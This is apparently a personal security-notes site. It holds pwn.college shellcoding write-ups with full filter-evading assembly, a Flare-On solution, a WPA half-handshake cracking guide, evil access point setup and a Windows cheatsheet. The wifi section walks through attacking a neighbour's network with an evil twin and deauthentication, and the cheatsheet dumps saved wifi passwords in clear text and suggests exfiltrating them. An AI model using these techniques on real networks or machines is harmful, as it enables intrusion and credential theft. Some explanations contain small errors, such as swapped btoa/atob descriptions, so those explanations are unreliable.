.intel_syntax noprefix
_start:
    mov rax, 0      ; zero out rax
    mov al, dil     ; take the last 8 bits of rdi into last 8 bits of rax
    mov rbx, 0      ; zero out rbx
    mov bx, si      ; take the last 16 bits of rsi into last 16 bits of rbx
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-1"><a class="header" href="#babyshell-level-1">Babyshell Level 1</a></h1>
<p>This is the first challenge of the shellcoding modules from pwn.college, it seems to me like a pretty simple challenge... however make sure to watch the videos on youtube before trying to complete those !</p>
<h2 id="how-the-challenge-works"><a class="header" href="#how-the-challenge-works">How the challenge works</a></h2>
<p>We are basically asked to &quot;inject position independant <strong>shell</strong>-code&quot;, we say position independant because the challenge base address change at every execution.</p>
<p>From our knowledge, we know that most of the time flag is stored in &quot;/flag&quot;, this means we can write a shellcode to read and output us this file.</p>
<p>I highly hope you have a great understanding of syscalls so far, if not i highly recommend you go read <a href="https://man7.org/tlpi/">The Linux Programming Interface</a> and <a href="https://www.oreilly.com/library/view/understanding-the-linux/0596005652/">Understanding the Linux Kernel, 3rd Edition</a>.</p>
<p>We will highly rely on syscalls on this module since it's pretty much the only thing we have at hands, we will rely specifically on <strong>sys_open</strong>, <strong>sys_sendfile</strong> and <strong>sys_exit</strong>.</p>
<p>As it looks pretty obvious, we will first <strong>open</strong> the file (file descriptor), <strong>sendfile</strong> to read the content of that file and send its output to a file descriptor and then <strong>exit</strong> the program cleanly.</p>
<h2 id="solving-the-challenge-2"><a class="header" href="#solving-the-challenge-2">Solving the Challenge</a></h2>
<p>I think we're ready to start writing shellcode, for this we will write a <strong>.s</strong> (source) file, compile it with gcc (<strong>gcc -nostdlib -static solve.s solve</strong>) and extract the <strong>.text</strong> section code (our shellcode), into another file (<strong>objcopy --dump-section .text=shellcode solve</strong>).</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # Open file descriptor
    mov rsi, 0                  # flags
    lea rdi, [rip+flag]         # path name
    mov rax, 2                  # syscall number (sys_open)
    syscall                     # syscall (call into kernel)

    # Read
    mov rdi, 1                  # out_fd
    mov rsi, rax                # in_fd
    mov rdx, 0                  # offset
    mov r10, 100                # count
    mov rax, 40                 # syscall (sys_sendfile)
    syscall                     # call into the kernel
    
    # Exit
    mov rax, 60                 # syscall (sys_exit)
    mov rdi, 42                 # exit number
    syscall                     # syscall
flag:
    .ascii &quot;/flag\0&quot;
</code></pre>
<p>Execute the program with our ./shellcode redirected to stdin and we should win this challenge :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-3"><a class="header" href="#babyshell-level-3">Babyshell Level 3</a></h1>
<p>Babyshell level 3 is the third challenge from pwn.college shellcoding module, it is pretty simple if you have watched the <a href="https://www.youtube.com/watch?v=715v_-YnpT8&amp;t=1968s">videos for the module</a>.</p>
<h2 id="solving-the-challenge-3"><a class="header" href="#solving-the-challenge-3">Solving The Challenge</a></h2>
<p>Solving the challenge is pretty straight forward, we need to remove all null bytes from our shellcode, if there is any null bytes in our shellcode the program will fail.</p>
<p>The challenge took me a couple hours to solve since i had to find instructions that doesn't contains any null bytes in their opcode, i found the following informations :
- a lot of time <strong>mov</strong> instructions have null bytes in their opcode, however with <strong>rbx</strong> that was not the case, so i used <strong>rbx</strong> a little in the final solution <strong>instead of directly moving the value &quot;/flag&quot; into rdi</strong>.
- if your string ends with a <strong>null character</strong>, you can <strong>replace it for a carriage return.</strong>
- <strong>push and pop</strong> can be easily used as a replacement for the <strong>mov</strong> instruction, just push the value on the stack and pop it back into any register you want, we will use this technique <strong>a LOT</strong>, this way we will spend less time trying to fix mov instructions with null bytes.</p>
<p>With the preceding informations we should have a really got view of how we will solve this challenge.</p>
<p>Let's start writing our shellcode, first we need a opened file descriptor to our flag file :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel
</code></pre>
<p>When this code executes it should return a file descriptor to the &quot;/flag&quot; file. </p>
<p>We moved the value &quot;/flag&quot; using ebx and a shift left because &quot;/flag&quot; is 5 bits long and moving a 5 bytes value inside rbx (8 bytes register), it would have certainly implied some null bytes in the opcode.</p>
<p>The value &quot;<strong>flag</strong>&quot;, is 4 bytes wide which <strong>fits inside ebx</strong>, so we can just <strong>move &quot;flag&quot; in ebx</strong>, <strong>shift it to the left 8 bits</strong> so we have space to put &quot;/&quot; in the <strong>lower 8 bits of ebx</strong>, and mov <strong>0x2f</strong> in it which is &quot;/&quot; in ascii encoding.</p>
<p>The next step was to actually put rbx inside rdi since rbx is not on the x64 kernel calling convention, so just push the value inside rbx onto the stack and pop it back inside rdi, and you should have done the hardest part in this shellcode.</p>
<p>The next steps are exactly as in the last challenge (babyshell 2), but in this one we'll use <strong>push and pop</strong> instructions instead of using the <strong>mov</strong> instruction for the arguments.</p>
<p>Just like in the last challenge we will use the <strong>sendfile systemcall</strong> to read the file and send it to a file descriptor, in our case (<strong>stdout</strong>).</p>
<p>The function definition for sendfile is the following :</p>
<pre><code class="language-c">ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
</code></pre>
<p>The function takes three arguments, the output file descriptor, the input file descriptor, the offset (in our case 0), and the count of bytes we wish to read.</p>
<p>On x86_64 linux the kernel interface uses the following register as calling convention  : <strong>%rdi, %rsi, %rdx, %r10, %r8 and %r9.</strong> Since <strong>sendfile</strong> had 4 arguments, we will need <strong>%rdi, %rsi, %rdx, %r10</strong>.</p>
<p>Let's write the second part of our shellcode :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel
</code></pre>
<p>With the preceding code, if you compile it, it should work and read the file, however we want a clean exit, to avoid any bug with our program when leaving or returning, for this reason we will write a last system call which will cause to exit the program cleanly :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel

	# Exit the program cleanly
	push 60 				# system call number
	pop rax					# pop system call number in rax
	push 69					# exit number
	pop rdi					# pop exit number in rdi
	syscall
</code></pre>
<p>And we should have a shellcode that contains no null bytes, just like the program asks us, let's make sure we did everything right :</p>
<pre><code>$ gcc -w -nostdlib -static -o shell shellcode.s -masm=intel
$ ./shell
flag{fake_flag_for_testing}
$ objcopy --dump-section .text=solver shell
$ xxd solver
</code></pre>
<p>After running xxd on the resulting file you should see all the bytes in hexadecimal the shellcode actually has, if it contains any &quot;00&quot; we have failed the shellcode, if it don't we successfully achieved what we wanted to :</p>
<pre><code>$ xxd solver
00000000: 4831 f6bb 666c 6167 48c1 e308 b32f 5348  H1..flagH..../SH
00000010: 89e7 6a02 580f 056a 015f 505e 4831 d26a  ..j.X..j._P^H1.j
00000020: 6441 5a6a 2858 0f05 6a3c 586a 2a5f 0f05  dAZj(X..j&lt;Xj*_..
</code></pre>
<p>And it looks to me like we were able to evade this no null-bytes filter on the shellcode !</p>
<p>Let's prove it :</p>
<pre><code>$ ./babyshell_level3 &lt;solver
flag{fake_flag_for_testing}
</code></pre>
<p>:)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-4"><a class="header" href="#babyshell-level-4">Babyshell Level 4</a></h1>
<p>This challenge was a bit like the last one, but this time the filter checks for the byte 0x48, so we need to test different registers to see which cause the opcode 0x48 and which register doesn't.</p>
<h2 id="solving-the-challenge-4"><a class="header" href="#solving-the-challenge-4">Solving The Challenge</a></h2>
<p>So we are going to start looking at every restriction on the current instruction in our program, since the challenge is pretty much the same we can just take the same shellcode we used in the precedent level and objdump it, this way we can see where our shellcode can potentially fail and which instructions we need to fix.</p>
<p>Also you can use the pwn.asm() functions instead of compiling the code and checking with objdump.</p>
<p>Those are the following restrictions on instructions i've had to deal with during the course of this challenge :</p>
<p>mov rdi, rsp - can't be used since it has a 0x48 in it's opcode
shl rbx, 8   - can't be used since it has a 0x48 in it's opcode</p>
<p>I've made a program that does shl, shr, rol, ror, sar, sal. Note how each of these instructions starts with the opcode 0x48, which we need to evade... this means we won't be able to use these instructions, also note that the instruction <strong>sal</strong> was translated to <strong>shl</strong> during compilation of the program :</p>
<pre><code class="language-x86asm">Disassembly of section .text:

0000000000401000 &lt;_start&gt;:
401000:       48 c1 e3 08             shl    rbx,0x8
401004:       48 c1 e0 08             shl    rax,0x8
401008:       48 c1 e2 08             shl    rdx,0x8
40100c:       48 c1 e6 08             shl    rsi,0x8
401010:       48 c1 e7 08             shl    rdi,0x8
401014:       48 c1 c3 08             rol    rbx,0x8
401018:       48 c1 c0 08             rol    rax,0x8
40101c:       48 c1 c2 08             rol    rdx,0x8
401020:       48 c1 c6 08             rol    rsi,0x8
401024:       48 c1 c7 08             rol    rdi,0x8
401028:       48 c1 eb 08             shr    rbx,0x8
40102c:       48 c1 e8 08             shr    rax,0x8
401030:       48 c1 ea 08             shr    rdx,0x8
401034:       48 c1 ee 08             shr    rsi,0x8
401038:       48 c1 ef 08             shr    rdi,0x8
40103c:       48 c1 e3 08             shl    rbx,0x8
401040:       48 c1 e0 08             shl    rax,0x8
401044:       48 c1 e2 08             shl    rdx,0x8
401048:       48 c1 e6 08             shl    rsi,0x8
40104c:       48 c1 e7 08             shl    rdi,0x8
401050:       48 c1 cb 08             ror    rbx,0x8 
401054:       48 c1 c8 08             ror    rax,0x8
401058:       48 c1 ca 08             ror    rdx,0x8
40105c:       48 c1 ce 08             ror    rsi,0x8
401060:       48 c1 cf 08             ror    rdi,0x8
401064:       48 c1 fb 08             sar    rbx,0x8
401068:       48 c1 f8 08             sar    rax,0x8
40106c:       48 c1 fa 08             sar    rdx,0x8
401070:       48 c1 ff 08             sar    rdi,0x8
401074:       48 c1 fe 08             sar    rsi,0x8
401078:       48 c1 e3 08             shl    rbx,0x8
40107c:       48 c1 e0 08             shl    rax,0x8
401080:       48 c1 e2 08             shl    rdx,0x8
401084:       48 c1 e7 08             shl    rdi,0x8
401088:       48 c1 e6 08             shl    rsi,0x8
</code></pre>
<p>We can conclude that we can't use bit shifting (shl, shr), bit rotating (ror, rol) or bit arithmetic shifting (sal, sar)</p>
<p>Next i've noticed some 0x48 bytes in the opcode of the &quot;<strong>mov rdi, rsp</strong>&quot; instruction... for this reason we are going to try to move every register possible inside rdi, to achieve this i wrote the following program (note how we were able to evade the filter using the r10 register) :</p>
<pre><code class="language-x86asm">Disassembly of section .text:

0000000000401000 &lt;_start&gt;:
401000:       48 c7 c0 01 00 00 00    mov    rax,0x1
401007:       48 89 c7                mov    rdi,rax
40100a:       48 89 c6                mov    rsi,rax
40100d:       48 89 f7                mov    rdi,rsi
401010:       48 89 c3                mov    rbx,rax
401013:       48 89 df                mov    rdi,rbx
401016:       48 89 c2                mov    rdx,rax
401019:       48 89 d7                mov    rdi,rdx
40101c:       49 89 c2                mov    r10,rax
40101f:       4c 89 d7                mov    rdi,r10
401022:       50                      push   rax
401023:       48 89 e7                mov    rdi,rsp
401026:       48 31 ff                xor    rdi,rdi
401029:       48 31 c0                xor    rax,rax
40102c:       48 31 f6                xor    rsi,rsi
40102f:       4d 31 d2                xor    r10,r10
401032:       48 31 db                xor    rbx,rbx
401035:       48 31 d2                xor    rdx,rdx
401038:       48 c7 c0 3c 00 00 00    mov    rax,0x3c
40103f:       48 c7 c7 2a 00 00 00    mov    rdi,0x2a
401046:       0f 05                   syscall
</code></pre>
<p>Notice that the <strong>xor instruction</strong> has the byte 0x48 in his opcode, for this reason we are going to need to avoid using the <strong>xor instruction</strong>.</p>
<p>So after noticing that i could bypass the filter using r10 register, i asked myself if i could use either a <strong>shr, shl, ror, rol, sar, sal</strong> instruction on the r10 register to bypass the filter :</p>
<pre><code class="language-x86asm">40108c:       49 c1 e2 08             shl    r10,0x8
401090:       49 c1 ea 08             shr    r10,0x8
401094:       49 c1 e2 08             shl    r10,0x8
401098:       49 c1 fa 08             sar    r10,0x8
40109c:       49 c1 ca 08             ror    r10,0x8
4010a0:       49 c1 c2 08             rol    r10,0x8
</code></pre>
<p>As you can notice it turns out that the r10 register does indeed bypass the filter, ALL HAIL R10 !!!! :)</p>
<p>So we can start writing the first part of our shellcode which is opening a file descriptor on the &quot;/flag&quot; file, in our case we won't be able to use rbx for our bit shifting like the last challenge since we can't shift rbx without causing a 0x48 opcode, which will make us fail the challenge.</p>
<p>For this reason i have used r10 in my code !</p>
<p>Other problem i ran into, <strong>rsi/rdx</strong> were set to some random values when i executed my shellcode so i'm going to need to clear them out, but i can't use <strong>xor rsi,rdi</strong> or <strong>xor rdx, rdx</strong>... in this case i will do <strong>xor r10, r10</strong> and then move r10 into rdx and rsi.</p>
<p>Next problem i ran into while trying to solve this challenge is that you can't directly move 0x2 into rax without having a 0x48 opcode, for this reason i am going to put 0x2 in the lower 8 bits of r10 (<strong>r10b</strong>) and do a <strong>mov al, r10b</strong>.</p>
<p>With all these problem fixed our open syscall should be able to bypass the filter imposed, let's write the first partof our shellcode :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    
    # Open a file descriptor on the &quot;/flag&quot; file
    mov r10d, 0x67616c66
    shl r10, 8
    mov r10b, 0x2f
    push r10
    pop r10
    mov rdi, r10
    xor r10, r10
    mov rsi, r10
    mov rdx, r10
    mov r10b, 0x2
    mov al, r10b
    syscall
</code></pre>
<p>Next step would be to use our sendfile instruction to read the file and send it out to the standard output file descriptor (0)...</p>
<p>We can pretty much rewrite the same as we did for the last challenge and it should work,... let's do that :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    
    # Open a file descriptor on the &quot;/flag&quot; file
    mov r10d, 0x67616c66
    shl r10, 8
    mov r10b, 0x2f
    push r10
    pop r10
    mov rdi, r10
    xor r10, r10
    mov rsi, r10
    mov rdx, r10
    mov r10b, 0x2
    mov al, r10b
    syscall

    # Read a the file we just opened and send it to stdout
    push 1
    pop rdi
    push rax
    pop rdi
    push 100
    pop r10
    push 40
    pop rax
    syscall

    push 60
    pop rax
    push 42
    pop rdi
    syscall
</code></pre>
<p>Now you can just compile it, extract the bytes from the <strong>.text</strong> section and we should win the challenge ! Let's prove that it works :</p>
<pre><code>$ gcc -w -nostdlib -static shellcode.s -o shellcode -masm=intel
$ objcopy --dump-section .text=solver shellcode
$ ./babyshell_level4 &lt;solver
flag{fake_flag_for_testing}
</code></pre>
<p>Annnnnd we did bypass the filter, it was pretty easy and nice to solve, if you had problems doing it on your own remember you can write programs to test instructions and dump their opcode using the objdump -D switch. :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-5"><a class="header" href="#babyshell-level-5">Babyshell Level 5</a></h1>
<p>Okay ! Now we are talking, this challenge was a little bit harder than the previous one, but was really fun to solve. Itried to solved it for like 3 hours before i quitted and the next day i was able to complete it on my own.</p>
<h2 id="solving-the-challenge-5"><a class="header" href="#solving-the-challenge-5">Solving the Challenge</a></h2>
<p><strong>What is the task :</strong> We need to write a shellcode that does not contains any <strong>syscall</strong> (0x0f05), <strong>sysenter</strong> (0x0f34) or <strong>int</strong> (0x80cd) opcodes in our shellcode, this makes it a LOT harder for us to call into the kernel since we n eed to write <strong>self-modifying code</strong>, for this challenge we will heavily rely on labels, make sure you know what they  are before jumping into this !</p>
<p>So, after a bit of researching on how i could write this &quot;self-modifying&quot; shellcode, i found on discord that we could use a label for that, we are going to put <strong>.word</strong> values in our labels, with the value of 0x0000, however when the program will run, it will modify the value of our <strong>.word</strong> in the label for the syscall opcode, and we can just call the location of [rip+label] to execute the syscall instructions, let's start writing code :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # prepare syscall
    mov byte ptr[rip+syscall1], 0x0f
    mov byte ptr[rip+syscall1+1], 0x05
    lea r9, [rip+syscall1]

    # clear registers
    xor rbx, rbx
    xor rdx, rdx
    xor rdi, rdi
    xor rsi, rsi
    xor r10, r10

    # open file
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rax, 2
    call r9                 # syscall we jump inside our label

# sys_sendfile
syscall1:
    .word 0x0000
    
    xor r9, r9
    # prepare next syscall
    mov byte ptr[rip+syscall2], 0x0f
    mov byte ptr[rip+syscall2+1], 0x05
    lea r9, [rip+syscall2]

    xor rsi, rsi
    xor r10,r10
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx
    # sendfile
    mov rdi, 1
    mov rsi, rax
    mov r10, 100
    mov rax, 40
    call r9

# sys_exit
syscall2:
    .word 0x0000

    xor r9, r9
    # prepare syscall
    mov byte ptr[rip+syscall3], 0x0f
    mov byte ptr[rip+syscall3], 0x05
    lea r9, [rip+syscall3]
    xor rsi, rsi
    xor r10, r10
    xor rax, rax
    xor rdi, rdi
    mov rax, 60
    mov rdi, 5
    call r9

syscall3:
    .word 0x0000
</code></pre>
<p>I am not sure it's the best optimized way to do this challenge, but i decided to do it this way and it works pretty well, i do a lot of registers clearing because i had an issue with the program where registers would change before executing syscall, by clearing register i was able to execute each syscalls and write the flag properly :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="credchecker"><a class="header" href="#credchecker">Credchecker</a></h1>
<p>Credchecker is the first challenge of the Flare-On 8 (2021) CTF Event and it was super easy to complete.</p>
<h2 id="the-challenge"><a class="header" href="#the-challenge">The Challenge</a></h2>
<p>We are given a <strong>admin.html</strong> file (which is the challenge meat), and a <strong>img</strong> directory containing an image (not important to us).</p>
<p>I first start a <strong>PHP Web Server</strong> using the following command
<code>php -S 127.0.0.1:6969</code></p>
<p>Then i can access the challenge using my browser at the following URL <strong>127.0.0.1:6969</strong>, let's see what the challenge page looks like in the first place.</p>
<p><img src="https://i.imgur.com/CXojMs8.png" alt="admin.html" /></p>
<h2 id="source-code"><a class="header" href="#source-code">Source Code</a></h2>
<p>To solve the challenge we need to look at the javascript code inside the <strong>admin.html</strong> file.</p>
<p>Whenever the button is pressed, the <strong>checkCreds()</strong> javascript function gets called.</p>
<p><img src="https://i.imgur.com/NVGdHtC.png" alt="button" /></p>
<p>Let's find this <strong>checkCreds()</strong> function.</p>
<p><img src="https://i.imgur.com/Y4OnfT7.png" alt="checkCreds" /></p>
<p>We're basically checking if <strong>btoa(ourInput)</strong> is equal to <strong>goldenticket</strong>, the <strong>btoa</strong> function takes a base64 string and decodes it.</p>
<p>We can assume that the password is the the base64 encoded verson of <strong>goldenticket</strong>, or <strong>atob(&quot;goldenticket&quot;)</strong> should also print you the password, the <strong>atob</strong> function takes an ascii string and encode it into base64.</p>
<p>Let's prove the password works...</p>
<p><img src="https://i.imgur.com/IP0qiPa.png" alt="goldenticket" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="half-handshake-crack"><a class="header" href="#half-handshake-crack">Half-Handshake Crack</a></h1>
<p>Sometimes when waiting for handshakes you will catch only the half part of that handshake, that is without the handshake being acknowledged by the network in question.
Know that those handshakes can be extremely useful in certain scenarios.</p>
<p>When listening for handshakes in public places, you will often see half handshakes popped up in your capture file (or wireshark, or whatever you use). These handshakes are as much crackable as full three-way handshakes, thing is you can't know for sure if the password is right since half-handshake aren't acknowledge by the router.</p>
<p>You can capture Half Handshake pretty easily, first you need an adapter that his compatible with the aircrack-ng suite, here's a small list of chipset compatible with aicrack.</p>
<ul>
<li>Ralink RT8070, RT3070</li>
<li>Ralink RT2770, RT2750</li>
<li>Ralink RT3572, RT5572</li>
<li>Ralink RT5370N</li>
<li>Realtek RTL8812AU</li>
<li>Atheros AR9002U</li>
<li>Realtek RTL8188SU</li>
<li>Realtek RTL8192EU</li>
<li>Atheros AR9271</li>
</ul>
<p>Next thing to do is to install the right drivers for the adapter your going to use, i use Atheros AR9002U (TN-WN722N) and RTL8812AU (AWUS036ACH), so i installed the following drivers to get started.</p>
<pre><code>$ git clone https://github.com/aircrack-ng/rtl8188eus
$ git clone https://github.com/aircrack-ng/rtl8812au
</code></pre>
<p>Then you should be ready to go, enable monitor mode (don't forget to change your mac address <em>wink wink</em>), start airodump.</p>
<pre><code>$ sudo airodump-ng &lt;device&gt;
</code></pre>
<p>Find a target network (make sure you have the right to crack it), and note the channel the network is currently using. Now let's start the real things, we are going to want to see what's going on in the airodump capture for this reason we'll manually capture the handshake with wireshark instead of using the airodump --write switch.</p>
<pre><code>$ sudo airodump-ng &lt;device&gt; -c &lt;network channel&gt; &amp; wireshark
</code></pre>
<p>Open the wireshark window, and double click on the interface your currently listening on with airodump, now you can copy the BSSID of your target network and we'll use a filter inside wireshark so we will see only the packets addressed to this network.</p>
<pre><code>Wireshark BSSID Filter : wlan.ta == &lt;bssid&gt; || wlan.da == &lt;bssid&gt;
Handshake filter : eapol &amp;&amp; wlan.da == &lt;bssid&gt; || eapol &amp;&amp; wlan.ta == &lt;bssid&gt;
</code></pre>
<p>Now you can wait until someone tries to connect to the network with a password, you should capture EAPOL packets when the key reach <strong>Message 2 of 4</strong>, you know you have your half handshake.</p>
<h2 id="social-engineering-scenario"><a class="header" href="#social-engineering-scenario">Social Engineering Scenario</a></h2>
<p>Okay let's go a little deeper because half-handshakes can be used in a tons of different scenario, but in this section we'll explore one. </p>
<p>So here it is, you are currently in your home and you want to hack into your neighbor's wifi (totally unethical and illegal), but you can't seem to get any handshake out of their network, what you could do is make an Evil Access Point that looks exactly like your target network (same name, bssid) and put some random password on this network, you will also launch a ddos attack agains't the target network so that the victim can't connect to his real network. Now your neighbor get's home after a long day of work, he see's that he his disconnected from the network so he tries to connect to it, prompt is usual password and he see's that it doesn't work. </p>
<p>At this point you should have catched at least a handshake or even more that you can crack, it's time to stop the attack and allow your poor neighbor to connect back again to it's network.</p>
<p>Check on wireshark using the <strong>eapol</strong> filter or the Handshake filter i shown a little earlier, if you have eapol packets with &quot;Key (Message 2 of 4)&quot; this means you successfully captured your half-handshake. Save the capture to a .pcap file and we can go to the next step.</p>
<h2 id="time-to-crack"><a class="header" href="#time-to-crack">Time to crack</a></h2>
<p>Now you have successfully gotten your hands on your handshake it's time to crack it. For this, you can use either a predefined wordlist (works sometimes), or if you know the target you could build one based on your target, in this case i will show you using a predefined wordlist <strong>rockyou.txt</strong>, the command is the same as usual but i will still show it.</p>
<pre><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt &lt;capture file&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-tn-wn722n"><a class="header" href="#monitor-mode-on-tn-wn722n">Monitor Mode on TN-WN722N</a></h1>
<p>Installing the required packages and configure them to make TN-WN722N works in monitor mode is pretty straight forward, let's see how to do it.</p>
<h2 id="arch-linux"><a class="header" href="#arch-linux">Arch Linux</a></h2>
<pre><code class="language-bash">	pamcan -Syu
	pacman -S install bc -y
	sudo rmmod r8188eu.ko
	git clone https://github.com/aircrack-ng/rtl8188eus
	cd rtl8188eus
	sudo -i
	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
	exit
	make
	sudo make install
	sudo modprobe 8188eu

	# You can ignore compilation errors related to redhat
</code></pre>
<h2 id="debian-based-system"><a class="header" href="#debian-based-system">Debian based System</a></h2>
<pre><code class="language-bash">	sudo apt update
	sudo apt install bc -y
	sudo rmmod r8188eu.ko
	git clone https://github.com/aircrack-ng/rtl8188eus
	cd rtl8188eus
	sudo -i
	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
	exit
	make
	sudo make install
	sudo modprobe 8188eu
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-awus036ach"><a class="header" href="#monitor-mode-on-awus036ach">Monitor Mode on AWUS036ACH</a></h1>
<p>Installing the required packages and configure them to make AWUS036ACH works in monitor mode is pretty straight forward, let's see how to do it.</p>
<h2 id="arch-linux-1"><a class="header" href="#arch-linux-1">Arch Linux</a></h2>
<pre><code class="language-bash">	pamcan -Syu
	pacman -S install bc -y
	 git clone https://github.com/aircrack-ng/rtl8812au.git
	cd rtl8812au
	make
	sudo make install
	reboot
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rpi-evil-ap-with-rtl88x2bu-wifi-card-driver"><a class="header" href="#rpi-evil-ap-with-rtl88x2bu-wifi-card-driver">RPI Evil AP with RTL88x2bu Wifi Card Driver</a></h1>
<p><em><strong>Fake / Evil AP's are great right !</strong></em></p>
<p>But sometime you want to make sure you have the most cheap pieces of equipment available so that if someone bust your device, you won't get mad losing it.</p>
<p>Hence this guide... RTL88x2bu is one of the cheapest wireless adapters available where i live, so i bought one a couple of years ago, but it was with disgust that i learn that this adapter didn't support monitor mode (this means i can't use it for attacks like deauth / dumping), and i also won't be able to see connections made on other networks.</p>
<p>Although the device can be used to make fake AP's, so this is what this guide will be about.</p>
<pre><code class="language-bash"># Update all packages per normal
sudo apt update
sudo apt upgrade

# Install prereqs
sudo apt install git dnsmasq hostapd bc build-essential dkms raspberrypi-kernel-headers

# Reboot just in case there were any kernel updates
sudo reboot

# Pull down the driver source
git clone https://github.com/cilynx/rtl88x2bu
cd rtl88x2bu/

# Configure for RasPi
sed -i 's/I386_PC = y/I386_PC = n/' Makefile
sed -i 's/ARM_RPI = n/ARM_RPI = y/' Makefile

# DKMS as above
VER=$(sed -n 's/\PACKAGE_VERSION=&quot;\(.*\)&quot;/\1/p' dkms.conf)
sudo rsync -rvhP ./ /usr/src/rtl88x2bu-${VER}
sudo dkms add -m rtl88x2bu -v ${VER}
sudo dkms build -m rtl88x2bu -v ${VER} # Takes ~3-minutes on a 3B+
sudo dkms install -m rtl88x2bu -v ${VER}

# Plug in your adapter then confirm your new interface name
ip addr

# Set a static IP for the new interface (adjust if you have a different interface name or preferred IP)
sudo tee -a /etc/dhcpcd.conf &lt;&lt;EOF
interface wlan1
    static ip_address=192.168.4.1/24
    nohook wpa_supplicant
EOF

# Clobber the default dnsmasq config
sudo tee /etc/dnsmasq.conf &lt;&lt;EOF
interface=wlan1
  dhcp-range=192.168.4.100,192.168.4.199,255.255.255.0,24h
EOF

# Configure hostapd
sudo tee /etc/hostapd/hostapd.conf &lt;&lt;EOF
interface=wlan1
driver=nl80211
ssid=pinet
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=CorrectHorseBatteryStaple
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

sudo sed -i 's|#DAEMON_CONF=&quot;&quot;|DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;|' /etc/default/hostapd

# Enable hostapd
sudo systemctl unmask hostapd
sudo systemctl enable hostapd

# Reboot to pick up the config changes
sudo reboot

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-cheatsheet"><a class="header" href="#windows-cheatsheet">Windows Cheatsheet</a></h1>
<p>Since i am more of the Linux type than Windows (for now), i will make this small cheatsheet where i will add, tips and tricks troughout time.</p>
<p>Note that those are a bit like personal notes but if you find something that should be changed or something that need to be added, feel free to reach out to me.</p>
<h2 id="export-wireless-profiles-with-passwords"><a class="header" href="#export-wireless-profiles-with-passwords">Export wireless profiles with passwords</a></h2>
<p>Exporting wireless profiles on Windows is something pretty simple to do, you can achieve this using the following command.</p>
<pre><code>$ netsh wlan export profile key=clear
</code></pre>
<p>This will export each network the computer recently connected to along with the passwords for these networks in a XML file.</p>
<p>You could write a script to export these files, either using a request, dns exfil, email, or anything that comes through your mind.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
